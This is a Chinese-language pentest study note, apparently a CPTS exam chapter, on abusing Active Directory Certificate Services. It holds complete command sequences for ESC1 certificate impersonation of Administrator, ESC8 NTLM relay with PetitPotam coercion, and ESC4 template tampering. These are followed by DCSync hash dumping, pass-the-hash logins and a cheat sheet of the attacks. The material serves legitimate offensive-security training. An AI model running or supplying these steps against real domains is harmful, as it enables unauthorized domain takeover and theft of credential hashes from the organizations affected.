# 第 79 章 - AD CS

## 標籤

- #cpts
- #chapter
- #active-directory
- #adcs
- #certificates

## 學習目標

- 理解 AD CS 的 ESC 系列漏洞（ESC1-ESC8）的原理。
- 用 Certipy / Certify 找出可利用的 certificate template。
- 能用憑證換取 TGT，進而做 PKINIT 認證或 NTLM hash 提取。
- 判斷環境中是否有 AD CS 且哪些 ESC 可利用。

---

## 理論基礎：AD CS 為什麼危險

AD CS（Active Directory Certificate Services）是微軟的 PKI 實作。憑證（Certificate）在 AD 中可以當作身份證，用來：
- 做 Kerberos PKINIT 認證（取得 TGT）
- 做 smart card 登入
- 取得帳號的 NTLM hash（通過 PKINIT 後 unPAC）

**核心問題**：如果某個 certificate template 設定錯誤，低權使用者可以申請到一張「代表高權帳號（如 Domain Admin）」的憑證，然後用這張憑證以高權帳號的身份做 Kerberos 認證，取得 TGT 和 NTLM hash。

---

## ESC 漏洞分類

| ESC | 名稱 | 條件 |
|-----|------|------|
| ESC1 | 申請時可指定 SAN（Subject Alternative Name）| 低權使用者可申請 + ENROLLEE_SUPPLIES_SUBJECT + 有 Client Auth EKU |
| ESC2 | Template 有 Any Purpose EKU | 任何用途都能用 |
| ESC3 | Certificate Request Agent | 可代申請其他人的憑證 |
| ESC4 | Template 有 Write 權限 | 可修改 template 設定來建立 ESC1 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 標誌 | CA 層級允許 SAN，和 template 設定無關 |
| ESC7 | CA 有 Manage CA / Manage Certificates | 可批准任意憑證請求 |
| ESC8 | NTLM Relay 到 AD CS HTTP Endpoint | 不需要憑證申請帳號 |

**最常考的是 ESC1 和 ESC8。**

---

## 工具一：Certipy（Linux 推薦）

```bash
# 安裝
pip3 install certipy-ad --break-system-packages

# 枚舉所有 CA 和 template（找有問題的設定）
certipy find -dc-ip DC_IP -u 'USERNAME@DOMAIN.LOCAL' -p 'PASSWORD' -vulnerable -stdout
# find       → 枚舉模式
# -dc-ip     → DC 的 IP
# -u         → 認證使用者（格式必須是 user@domain）
# -p         → 密碼
# -vulnerable → 只顯示有 ESC 問題的 template（否則輸出很長）
# -stdout    → 直接輸出到終端機（不存 JSON/txt 檔案）

# 存成 JSON 和 txt 檔案（詳細分析用）
certipy find -dc-ip DC_IP -u 'USERNAME@DOMAIN.LOCAL' -p 'PASSWORD'
# 生成 [timestamp].json 和 [timestamp].txt
```

---

## 攻擊一：ESC1（SAN 欺騙，最常見）

### 理論

Template 允許申請者在 Subject Alternative Name（SAN）欄位填入任意使用者名稱。你用自己的帳號申請，但在 SAN 填入 `Administrator`，CA 就會簽發一張「代表 Administrator」的憑證。

**條件（三個都要滿足）：**
1. Template 有 `ENROLLEE_SUPPLIES_SUBJECT` 旗標
2. Template 有 Client Authentication EKU
3. 低權使用者（或 Domain Users）有申請權限

```bash
# Step 1：確認 ESC1（certipy find 輸出中看到 ESC1）
# 記下 Template Name 和 CA Name

# Step 2：申請憑證（以 Administrator 身份）
certipy req \
  -dc-ip DC_IP \
  -u 'USERNAME@DOMAIN.LOCAL' \
  -p 'PASSWORD' \
  -ca 'CA_NAME' \
  -template 'VULNERABLE_TEMPLATE' \
  -upn 'Administrator@DOMAIN.LOCAL'
# req         → 申請憑證模式
# -ca         → CA 名稱（從 find 輸出取得）
# -template   → template 名稱
# -upn        → User Principal Name，填 Administrator 的 UPN
#               這就是 SAN 的值 → 憑證代表 Administrator

# 輸出：administrator.pfx（包含憑證和私鑰的 PKCS#12 檔案）

# Step 3：用憑證認證，取得 TGT 和 NTLM hash
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# auth        → 認證模式（PKINIT）
# -pfx        → 之前申請到的憑證檔案
# 輸出：administrator.ccache（TGT）和 Administrator 的 NT hash

# Step 4：使用取得的 hash 或 ticket
export KRB5CCNAME=administrator.ccache
python3 secretsdump.py -k -no-pass DOMAIN.LOCAL/Administrator@DC_FQDN
# 或用 hash：
python3 secretsdump.py -hashes :NT_HASH DOMAIN/Administrator@DC_IP
```

---

## 攻擊二：ESC8（NTLM Relay 到 AD CS Web 介面）

### 理論

AD CS 的 Web Enrollment 介面（http://CA_HOST/certsrv/）預設支援 NTLM 認證。如果能讓 DC 機器帳號的 NTLM 認證被 relay 到這個介面，可以申請到一張代表 DC 機器帳號的憑證，進而做 DCSync。

```bash
# Step 1：確認 AD CS Web Enrollment 介面存在
curl -I http://CA_HOST/certsrv/
# 如果回傳 401 (Unauthorized) → 介面存在且支援認證

# Step 2：用 ntlmrelayx relay 到 AD CS
python3 ntlmrelayx.py \
  -t http://CA_HOST/certsrv/ \
  --adcs \
  --template 'DomainController'
# -t http://CA_HOST/certsrv/ → relay 目標：AD CS Web Enrollment
# --adcs                     → 啟用 AD CS relay 模式（申請憑證而不是 dump SAM）
# --template 'DomainController' → 用 Domain Controller template

# Step 3：觸發 DC 的 NTLM 認證（coercion）
python3 PetitPotam.py KALI_IP DC_IP
# 讓 DC 向 Kali 發起 NTLM 認證 → ntlmrelayx 把它轉到 AD CS

# Step 4：ntlmrelayx 輸出 base64 格式的憑證
# 解碼並轉成 pfx
echo "BASE64_CERT" | base64 -d > dc01.pfx

# Step 5：用 DC 機器帳號的憑證做 PKINIT
certipy auth -pfx dc01.pfx -dc-ip DC_IP
# 取得 DC 機器帳號的 TGT 和 NT hash

# Step 6：用機器帳號 NT hash 做 DCSync
python3 secretsdump.py -hashes :NT_HASH 'DOMAIN/DC01$'@DC_IP
```

---

## 攻擊三：ESC4（修改 Template 建立 ESC1）

```bash
# 如果你有 template 的 WriteProperty 權限，可以把它改成 ESC1
certipy template \
  -dc-ip DC_IP \
  -u 'USERNAME@DOMAIN.LOCAL' \
  -p 'PASSWORD' \
  -template 'TARGET_TEMPLATE' \
  -save-old   # 儲存原始設定（之後可以 restore）

# 把 template 修改成允許 SAN + ESC1 條件
certipy template \
  -dc-ip DC_IP \
  -u 'USERNAME@DOMAIN.LOCAL' \
  -p 'PASSWORD' \
  -template 'TARGET_TEMPLATE' \
  -configuration 'msPKI-Certificate-Name-Flag=1'
# msPKI-Certificate-Name-Flag=1 → 設定 ENROLLEE_SUPPLIES_SUBJECT

# 修改後執行 ESC1 攻擊
certipy req -dc-ip DC_IP -u 'USERNAME@DOMAIN.LOCAL' -p 'PASSWORD' \
  -ca 'CA_NAME' -template 'TARGET_TEMPLATE' -upn 'Administrator@DOMAIN.LOCAL'
```

---

## 取得憑證後的完整流程

```bash
# 用 Certipy 做 PKINIT 認證
certipy auth -pfx admin.pfx -dc-ip DC_IP
# 輸出：
# [*] Got hash for 'administrator@domain.local': aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
# [*] Saved credential cache to 'administrator.ccache'

# 用 NT hash
nxc smb DC_IP -u Administrator -H 'NT_HASH'
evil-winrm -i DC_IP -u Administrator -H 'NT_HASH'

# 用 TGT
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass DOMAIN/Administrator@DC_FQDN
```

---

## WSL2 時鐘修正（PKINIT 必做）

```bash
# PKINIT 對時間敏感（和 Kerberos 一樣），WSL2 時鐘常偏差
# 查 DC 當前時間
CT=$(ldapsearch -x -H ldap://DC_IP -D "USER@DOMAIN.LOCAL" -w PASS \
  -b "" -s base currentTime 2>/dev/null | grep currentTime | awk '{print $2}')
DC_TIME="${CT:0:4}-${CT:4:2}-${CT:6:2} ${CT:8:2}:${CT:10:2}:${CT:12:2}"

# 用 faketime 執行 certipy auth
TZ=UTC faketime "$DC_TIME" certipy auth -pfx admin.pfx -dc-ip DC_IP
```

---

## 判斷邏輯

```
有 AD CS 嗎？
├── 沒有 → 跳過這章
└── 有 → certipy find -vulnerable 掃描

有 ESC1？（最常見）
├── 有 → certipy req -upn Administrator → certipy auth → 取 hash
└── 沒有

有 ESC8？（AD CS Web Enrollment 可 relay）
├── 有 → ntlmrelayx --adcs + PetitPotam → 取 DC 機器帳號憑證 → DCSync
└── 沒有

有 ESC4？（Template 可寫）
└── 有 → certipy template 改設定 → 建立 ESC1 條件 → 執行 ESC1
```

---

## 速查表

```bash
# 枚舉 AD CS 漏洞
certipy find -dc-ip DC_IP -u 'USER@DOMAIN.LOCAL' -p PASS -vulnerable -stdout

# ESC1：申請高權憑證
certipy req -dc-ip DC_IP -u 'USER@DOMAIN.LOCAL' -p PASS \
  -ca 'CA_NAME' -template 'TEMPLATE' -upn 'Administrator@DOMAIN.LOCAL'

# 用憑證取 hash
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# ESC8：Relay 到 AD CS
python3 ntlmrelayx.py -t http://CA_HOST/certsrv/ --adcs --template DomainController
python3 PetitPotam.py KALI_IP DC_IP
```

---

## 關聯筆記

- [[75-Kerberos攻擊|第 75 章 - Kerberos 攻擊]]
- [[76-NTLM攻擊|第 76 章 - NTLM 攻擊（Relay）]]
- [[77-ADACL濫用|第 77 章 - AD ACL 濫用]]
- [[09-Volume-9-Active-Directory-Index|Vol.9 - Active Directory]]
